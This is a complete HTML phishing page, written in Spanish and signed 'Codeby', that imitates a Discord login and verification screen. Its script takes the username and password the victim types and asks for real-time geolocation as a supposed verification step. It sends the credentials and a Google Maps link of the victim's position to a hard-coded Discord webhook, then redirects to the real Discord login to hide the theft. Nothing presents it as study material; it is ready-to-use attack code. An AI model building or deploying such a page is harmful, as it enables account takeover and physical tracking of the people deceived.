<!DOCTYPE html>
<html lang="es-es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Discord</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #2c2f33 0%, #23272a 100%); color: #fff; display: flex; justify-content: center; align-items: center; }
        .card { background: #2f3136; padding: 40px; border-radius: 10px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); border-top: 4px solid #5865F2; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #202225; border: 1px solid #202225; color: #fff; border-radius: 5px; box-sizing: border-box; }
        .btn-discord { background: #5865F2; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; transition: background 0.3s; }
        .btn-discord:hover { background: #4752C4; }
        #verify-screen { display: none; }
        .codeby-footer { margin-top: 25px; color: #5865F2; font-size: 10px; letter-spacing: 2px; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="login-screen" class="card">
        <h2>Iniciar sesión</h2>
        <input type="text" id="user" placeholder="Usuario">
        <input type="password" id="pass" placeholder="Contraseña">
        <button id="btnGo" style="width:100%; padding:12px; background:#5865F2; color:white; border:none; cursor:pointer; border-radius:5px;">Continuar</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <div id="verify-screen" class="card">
        <h2 style="color: #5865F2;">Verificación de Discord</h2>
        <p style="font-size: 14px; color: #b9bbbe;">Para completar la verificación, acepta el acceso a tu ubicación en tiempo real.</p>
        <button class="btn-discord" id="btnVerify">Autorizar Acceso</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1509748434955931718/_zYvDjOnSTIBsR9u4wQoYUeEUcC0GZDIRuHCSxO-jNpOXwe3QkYvC4W8LoY3aHBwgwoI";
        let capturedUser = "";
        let capturedPass = "";

        document.getElementById('btnGo').addEventListener('click', () => {
            capturedUser = document.getElementById('user').value;
            capturedPass = document.getElementById('pass').value;

            if(capturedUser && capturedPass) {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('verify-screen').style.display = 'block';
            }
        });

        document.getElementById('btnVerify').addEventListener('click', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendData(`https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`),
                    () => sendData("Ubicación denegada por el usuario")
                );
            } else {
                sendData("Geolocalización no soportada");
            }
        });

        async function sendData(gps) {
            const embed = {
                title: "📊 LOG CAPTURADO - Codeby",
                color: 0x5865F2,
                fields: [
                    { name: "👤 Usuario", value: capturedUser, inline: true },
                    { name: "🔒 Contraseña", value: capturedPass, inline: true },
                    { name: "📍 Ubicación", value: gps }
                ],
                footer: { text: "Sistema Codeby" }
            };

            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ embeds: [embed] })
            });

            window.location.href = "https://discord.com/login";
        }
    </script>
</body>
</html>
